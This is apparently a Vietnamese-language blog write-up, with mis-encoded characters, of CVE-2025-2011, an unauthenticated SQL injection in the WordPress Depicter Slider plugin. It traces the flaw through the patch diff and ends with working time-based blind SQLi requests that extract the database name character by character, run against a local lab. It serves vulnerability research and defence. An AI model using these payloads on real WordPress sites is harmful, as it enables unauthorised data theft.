# CVE-2025-2011 Analysis & POC


<!--more-->

Lá»— há»•ng xáº£y ra trÃªn plugin **Depicter Slider** cá»§a WordPress trÆ°á»›c phiÃªn báº£n **3.6.2**. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.

* **CVE ID**: [CVE-2025-2011](https://www.cve.org/CVERecord?id=CVE-2025-2011)
* **Product**: [WordPress Depicter Slider Plugin](https://wordpress.org/plugins/depicter/)
* **Vulnerability Type**: SQL Injection
* **Affected Versions**: <= 3.6.1
* **CVSS severity**:  High (9.3)
* **Required Privilege**: Unauthenticated

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Depicter Slider**:  v3.6.1(vul) vÃ  v3.6.2(fix)
* **diff tool**: **meld** hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version

## Analysis

NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« **GET** request vÃ o SQL query mÃ  khÃ´ng cÃ³ cÆ¡ cháº¿ kiá»ƒm soÃ¡t cháº·t cháº½.

### Patch Diff

DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡.
CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file **app/src/Controllers/Ajax/LeadsAjaxController.php**

`index`, `list`, `export` lÃ  3 hÃ m Ä‘Ã¡ng chÃº Ã½ náº±m trong class `LeadsAjaxController`

```php
public function index(RequestInterface $request, $view)
{
    $args = [
        's'         => Sanitize::textfield($request->query('s', '')),
        // other logic
    ];

    $response   = \Depicter::lead()->get($args);
    $statusCode = isset($response['errors']) ? 400 : 200;

    return \Depicter::json($response)->withStatus($statusCode);
}
```

```php
public function list(RequestInterface $request, $view)
{
    $args = [
        's'                => Sanitize::textfield($request->query('s', '')),
        // other logic
    ];

    $response = \Depicter::leadRepository()->getResults($args);

    return \Depicter::json($response);
}
```

```php
public function export(RequestInterface $request, $view)
{
    $args = [
        's'                => Sanitize::textfield($request->query('s', '')),
        // other logic
    ];

    $response = \Depicter::leadRepository()->getResults($args);

    // other logic

    return \Depicter::json([
        'errors' => [__('error occurred during the export process', 'depicter')]
    ])->withStatus(400);
}
```

Cáº£ 3 hÃ m Ä‘á»u Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch sá»­ dá»¥ng `Sanitize::sql` thay cho `Sanitize::textfield` nháº±m Ä‘áº£m báº£o param `'s'` Ä‘Æ°á»£c lÃ m sáº¡ch vÃ  escape phÃ¹ há»£p cho ngá»¯ cáº£nh cÃ¢u lá»‡nh SQL.

{{< figure src="patch_dif.png" title="áº¢nh minh há»a sá»± khÃ¡c biá»‡t báº£n vÃ¡ vÃ  báº£n lá»—i" >}}

### How it work?

Äá»ƒ hiá»ƒu rÃµ hÆ¡n chá»©c nÄƒng cá»§a `textfield` vÃ  `sql` ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a `function textfield`, cÃ³ láº½ chÃºng Ä‘Æ°á»£c Ä‘áº·t trong cÃ¹ng 1 file vÃ¬ Ä‘Æ°á»£c gá»i báº±ng cÃ¹ng 1 class `Sanitize`

> Náº¿u báº¡n Ä‘Ã£ cÃ i **PHP Intelephense Extension** trong **vscode**, báº¡n cÃ³ thá»ƒ di chuyá»ƒn Ä‘áº¿n hÃ m cá»¥ thá»ƒ báº±ng cÃ¡ch <kbd>Ctrl</kbd> <kbd>+</kbd> <kbd>Click</kbd> vÃ o hÃ m cáº§n Ä‘áº¿n.

{{< figure src="search_1.png" title="TÃ¬m kiáº¿m hÃ m textfield trong class Sanitize" >}}

`textfield` tráº£ vá» dá»¯ liá»‡u Ä‘Ã£ Ä‘Æ°á»£c **sanitize** báº±ng `sanitize_text_field`, `sql` cÅ©ng lÃ  hÃ m trong cÃ¹ng class, tráº£ vá» dá»¯ liá»‡u Ä‘Ã£ Ä‘Æ°á»£c **escape SQL**

```php
public static function sql( $input )
{
    return esc_sql( $input );
}
```

VÃ¬ Ä‘Ã¢y lÃ  lá»— há»•ng **unauthenticated**, viá»‡c cÃ³ 3 hÃ m nhÆ° nÃ y, ta cáº§n xÃ¡c Ä‘á»‹nh xem Ä‘iá»ƒm gá»i Ä‘áº¿n chÃºng cÃ³ cÆ¡ cháº¿ xÃ¡c thá»±c hay khÃ´ng. Chá»‰ sau khi cháº¯c cháº¯n ráº±ng hÃ m nÃ o thá»±c sá»± Ä‘Æ°á»£c gá»i trong bá»‘i cáº£nh khÃ´ng yÃªu cáº§u xÃ¡c thá»±c, ta má»›i tiáº¿p tá»¥c phÃ¢n tÃ­ch pháº§n logic bÃªn trong Ä‘á»ƒ kiá»ƒm tra kháº£ nÄƒng gÃ¢y ra SQL Injection giÃºp giá»›i háº¡n pháº¡m vi truy váº¿t.

Äá»ƒ xÃ¡c Ä‘á»‹nh 3 hÃ m trÃªn Ä‘Æ°á»£c gá»i á»Ÿ Ä‘Ã¢u, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m trá»±c tiáº¿p theo tÃªn hÃ m. Tuy nhiÃªn, cÃ¡c tá»« khÃ³a nhÆ° `index`, `list`, hay `export` láº¡i quÃ¡ phá»• biáº¿n nÃªn káº¿t quáº£ tÃ¬m kiáº¿m sáº½ ráº¥t nhiá»u vÃ  khÃ³ lá»c. VÃ¬ váº­y, thay vÃ¬ tÃ¬m theo tÃªn hÃ m, ta tÃ¬m vá»›i tá»« khÃ³a lÃ  tÃªn class `LeadsAjaxController`. Bá»Ÿi láº½ khi Ä‘Æ°á»£c sá»­ dá»¥ng, cÃ¡c hÃ m nÃ y Ä‘á»u pháº£i Ä‘Æ°á»£c gá»i thÃ´ng qua class, nhá» Ä‘Ã³ pháº¡m vi káº¿t quáº£ tÃ¬m kiáº¿m sáº½ Ä‘Æ°á»£c thu háº¹p vÃ  dá»… dÃ ng hÆ¡n.

{{< figure src="search_2.png" title="Káº¿t quáº£ tÃ¬m kiáº¿m LeadsAjaxController trong mÃ£ nguá»“n" >}}

ğŸ‘‰ `LeadsAjaxController` Ä‘Æ°á»£c sá»­ dá»¥ng trong quÃ¡ trÃ¬nh Ä‘Äƒng kÃ½ **route Ajax**. Khi cÃ³ request gá»­i tá»›i endpoint `/wp-admin/admin-ajax.php?action=action_here&param1=param1_here&paramN=paramN_here`, há»‡ thá»‘ng sáº½ dá»±a trÃªn khai bÃ¡o `handle('LeadsAjaxController@function')` Ä‘á»ƒ gá»i tá»›i phÆ°Æ¡ng thá»©c tÆ°Æ¡ng á»©ng trong class `LeadsAjaxController`

Cáº£ ba hÃ m ta Ä‘ang **focus** Ä‘á»u Ä‘Æ°á»£c gá»i báº±ng phÆ°Æ¡ng thá»©c **GET**, nhÆ°ng `export` láº¡i cÃ³ **middleware** xá»­ lÃ½ `csrf-api`, nÃªn ta bá» qua. Chá»‰ truy váº¿t `index` vÃ  `list`

Khi phÃ¢n tÃ­ch hai hÃ m nÃ y, ta tháº¥y trong hÃ m `index`, biáº¿n `$response` Ä‘Æ°á»£c gÃ¡n giÃ¡ trá»‹ tá»« `\Depicter::lead()->get($args)`. Tuy nhiÃªn, phÆ°Æ¡ng thá»©c `get()` láº¡i tiáº¿p tá»¥c gá»i Ä‘áº¿n `\Depicter::leadRepository()->getResults($args)`, tá»©c lÃ  cÃ¹ng má»™t logic mÃ  hÃ m `list` Ä‘Ã£ gá»i trá»±c tiáº¿p. Do Ä‘Ã³, ta chá»n hÃ m `list` lÃ m Ä‘iá»ƒm truy váº¿t chÃ­nh.

```php
public function list(RequestInterface $request, $view)
{
    $args = [
        's'                => Sanitize::textfield($request->query('s', '')),
        'ids'              => Sanitize::textfield($request->query('ids', '')),
        'sources'          => Sanitize::textfield($request->query('sources', '')),
        'dateStart'        => Sanitize::textfield($request->query('dateStart', '')),
        'dateEnd'          => Sanitize::textfield($request->query('dateEnd', '')),
        'order'            => Sanitize::textfield($request->query('order', 'DESC')),
        'orderBy'          => Sanitize::textfield($request->query('orderBy', 'id')),
        'page'             => Sanitize::int($request->query('page', 1)),
        'perPage'          => Sanitize::int($request->query('perpage', 10)),
        'columns'          => Sanitize::textfield($request->query('columns', '')),
        'includeFields'    => Sanitize::textfield($request->query('includeFields', false)),
        'skipCustomFields' => Sanitize::textfield($request->query('skipCustomFields', false))
    ];

    $response = \Depicter::leadRepository()->getResults($args);

    return \Depicter::json($response);
}
```

Äá»ƒ biáº¿t `getResults` thá»±c thi query nhÆ° nÃ o, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a `function getResults` hoáº·c <kbd>Ctrl</kbd> <kbd>+</kbd> <kbd>Click</kbd> vÃ o `getResults`

{{< figure src="search_3.png" title="Vá»‹ trÃ­ Ä‘á»‹nh nghÄ©a hÃ m getResults trong LeadRepository" >}}

ğŸ‘‰ Khi tÃ¬m kiáº¿m, ta tháº¥y káº¿t quáº£ cÃ³ hai hÃ m `getResults`. Dá»±a vÃ o tÃªn class cÃ³ thá»ƒ nháº­n tháº¥y sá»± liÃªn quan giá»¯a class `LeadRepository` vÃ  hÃ m `leadRepository()`, nhiá»u kháº£ nÄƒng `Depicter::leadRepository()` sáº½ tráº£ vá» má»™t **instance** cá»§a class **LeadRepository**. BÃªn cáº¡nh Ä‘Ã³, ta cÃ³ thá»ƒ dá»±a vÃ o sá»‘ lÆ°á»£ng tham sá»‘ truyá»n vÃ o Ä‘á»ƒ xÃ¡c Ä‘á»‹nh chÃ­nh xÃ¡c hÃ m **getResults** nÃ o má»›i lÃ  hÃ m cáº§n phÃ¢n tÃ­ch.

Ta tháº¥y Ä‘iá»u kiá»‡n `if`,khi khÃ´ng cÃ³ param `includeFields` thÃ¬ `getLeadsResults` sáº½ Ä‘Æ°á»£c gá»i, quan sÃ¡t `getLeadsResults` trong cÃ¹ng class:

```php
protected function getLeadsResults( $args ){
    // Purpose of joining tables is being able to search in leadField values as well
    $leadTable = $this->lead()->getTable();
    $leads = Lead::new()->select(
        "{$leadTable}.id",
        "{$leadTable}.source_id",
        "{$leadTable}.content_id",
        "{$leadTable}.content_name",
        "{$leadTable}.created_at",
        "lf.name as fieldName",
        "lf.value as fieldValue"
    )->join( "{$this->leadField()->getTable()} AS lf", "{$leadTable}.id", "=", "lf.lead_id" );

    // other logic

    if( ! empty( $args['s'] ) ){
        $search = "'%". $args['s'] ."%'";
        $leads->appendRawWhere('AND', "( lf.value like {$search} OR {$leadTable}.content_name like {$search} )");
    }

    $results = $this->paginate( $leads, $args );
}
```

Ta tháº¥y param `s`, nÆ¡i Ä‘Æ°á»£c báº£n vÃ¡ báº£o vá»‡ Ä‘Ã£ Ä‘Æ°á»£c ná»‘i trá»±c tiáº¿p vÃ o cÃ¢u query báº±ng hÃ m `appendRawWhere`. Khi Ä‘Ã³ 1 pháº§n query tÆ°Æ¡ng á»©ng sáº½ lÃ :

```sql
AND (lf.value like '%s_here%' OR leadtable.content_name like '%s_here%')
```

ğŸ‘‰ NhÆ° váº­y khi gá»­i **GET request** Ä‘áº¿n `/wp-admin/admin-ajax.php` vá»›i params:

```
action=depicter-lead-index&s=payload_here
```

* `list` Ä‘Æ°á»£c gá»i vá»›i duy nháº¥t param `s` Ä‘Æ°á»£c thÃªm vÃ o `$args`, cÃ²n láº¡i Ä‘Æ°á»£c set giÃ¡ trá»‹ máº·c Ä‘á»‹nh
* `getResults` Ä‘Æ°á»£c gá»i vá»›i Ä‘á»‘i sá»‘ `$args`
* Äiá»u kiá»‡n `if( ! $args['includeFields'] )` trong `getResults` khi `includeFields` máº·c Ä‘á»‹nh lÃ  `false` => `getLeadsResults` Ä‘Æ°á»£c gá»i
* Thá»±c hiá»‡n truy váº¥n gÃ¢y lá»—i SQLi

## Exploit

### Detect SQLi

Gá»­i **GET request** chá»©a payload SQLi.

```http
GET /wp-admin/admin-ajax.php?action=depicter-lead-list&s=999%25'+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1
Host: localhost
...
Cookie: cookie_here
```

Payload Ä‘Æ°á»£c decode:

```sql
999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- -
```

Khi Ä‘Ã³ má»™t pháº§n cá»§a cÃ¢u query trá»Ÿ thÃ nh

```sql
AND (lf.value like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- ' OR leadtable.content_name like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #')
```

{{< figure src="resp_time.png" title="Thá»i gian pháº£n há»“i thá»ƒ hiá»‡n payload hoáº¡t Ä‘á»™ng" >}}

ğŸ‘‰ Dá»±a trÃªn thá»i gian pháº£n há»“i => payload hoáº¡t Ä‘á»™ng.

**Subquery trong má»‡nh Ä‘á» FROM**: Truy váº¥n con Ä‘Æ°á»£c coi lÃ  báº£ng táº¡m thá»i. MySQL pháº£i thá»±c thi truy váº¥n con nÃ y Ä‘áº§u tiÃªn Ä‘á»ƒ táº¡o báº£ng táº¡m thá»i, sau Ä‘Ã³ má»›i thá»±c thi truy váº¥n chÃ­nh.

### Get First Letter of Database Name

Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ **dump Ä‘Æ°á»£c háº¿t data** lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ gáº§n nhÆ° toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.

Gá»­i request vá»›i **SQLi payload**:

```http
GET /wp-admin/admin-ajax.php?action=depicter-lead-list&s=999%25'+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1
Host: localhost
...
Cookie: cookie_here
```

Sá»­ dá»¥ng `SUBSTRING()` Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a **database name**, `IF()` tráº£ vá» `SLEEP(5)` náº¿u kÃ½ tá»± Ä‘Ã³ lÃ  `0x77`('w')

Sá»­ dá»¥ng hex encoding `w` thÃ nh `0x77` vÃ¬ `s` Ä‘Æ°á»£c láº¥y tá»« **GET** request trong nÃªn bá»‹ escape bá»Ÿi [magic quotes](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes) trong WordPress vÃ  bá»Ÿi `sanitize_text_field`.

ğŸ‘‰ Dá»±a trÃªn thá»i gian pháº£n há»“i => kÃ­ tá»± Ä‘áº§u tiÃªn Ä‘Ãºng lÃ  `w`.

## Conclusion

Lá»— há»•ng **CVE-2025-2011** trong plugin WordPress **Depicter Slider** trÆ°á»›c phiÃªn báº£n **3.6.2**, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.

Báº£n vÃ¡ Ä‘Ã£ **escape SQL** khiáº¿n dá»¯ liá»‡u trÆ°á»›c khi Ä‘Æ°a vÃ o trá»Ÿ thÃ nh chuá»—i thuáº§n khÃ´ng thá»ƒ thoÃ¡t ra khá»i `'%...%'`

**Key takeaways**:

* Kiá»ƒm soÃ¡t ká»¹ input tá»« ngÆ°á»i dÃ¹ng.
* LuÃ´n sá»­ dá»¥ng `$wpdb->prepare()` khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection.
* ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[ WordPress Depicter Slider Plugin <= 3.6.1 is vulnerable to SQL Injection ](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)


---

> TÃ¡c giáº£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-09-30-cve-2025-2011/  

